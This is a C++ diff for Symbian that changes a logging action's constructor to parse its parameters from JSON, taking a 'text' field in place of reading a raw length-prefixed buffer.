@@ -8,6 +8,7 @@
 #include "ActionLog.h"
 #include <HT\LogFile.h>
 
+#include "Json.h"
 
 CActionLog::CActionLog() :
 	CAbstractAction(EAction_Log)
@@ -38,21 +39,45 @@ CActionLog* CActionLog::NewL(const TDesC8& params)
 void CActionLog::ConstructL(const TDesC8& params)
 	{
 		BaseConstructL(params);
-		// TODO: parse params, verify
-		TUint8* ptr = (TUint8 *)iParams.Ptr();
-		TUint32 lenText = 0;   // in bytes including NULL terminator
-		Mem::Copy(&lenText, ptr, 4);
-		ptr += sizeof(TUint32);
 		
-		iLogText = HBufC8::NewL(lenText);
-					
-		if (lenText > 0)
-		{
-			TPtr8 ptrText((TUint8*)ptr,lenText,lenText);
-			iLogText->Des().Append(ptrText);	
-			//*iLogText = ptrText;
-		}
+		//parse params
+		RBuf paramsBuf;
 			
+		TInt err = paramsBuf.Create(2*params.Size());
+		if(err == KErrNone)
+			{
+			paramsBuf.Copy(params);
+			}
+		else
+			{
+			//TODO: not enough memory
+			}
+		TBuf<128> text;	
+		paramsBuf.CleanupClosePushL();
+		CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+		CleanupStack::PushL(jsonBuilder);
+		jsonBuilder->BuildFromJsonStringL(paramsBuf);
+		CJsonObject* rootObject;
+		jsonBuilder->GetDocumentObject(rootObject);
+		if(rootObject)
+			{
+			CleanupStack::PushL(rootObject);
+			//retrieve text
+			rootObject->GetStringL(_L("text"),text);
+			CleanupStack::PopAndDestroy(rootObject);
+			}
+
+		CleanupStack::PopAndDestroy(jsonBuilder);
+		CleanupStack::PopAndDestroy(&paramsBuf);
+		
+		TUint8* ptr = (TUint8 *)text.Ptr();
+		TInt lenText = text.Size();
+		iLogText = HBufC8::NewL(lenText);
+		if (lenText > 0)
+			{
+			TPtr8 ptrText((TUint8*)ptr,lenText,lenText);
+			iLogText->Des().Append(ptrText); 	
+			}
 	}
 
 void CActionLog::DispatchStartCommandL()
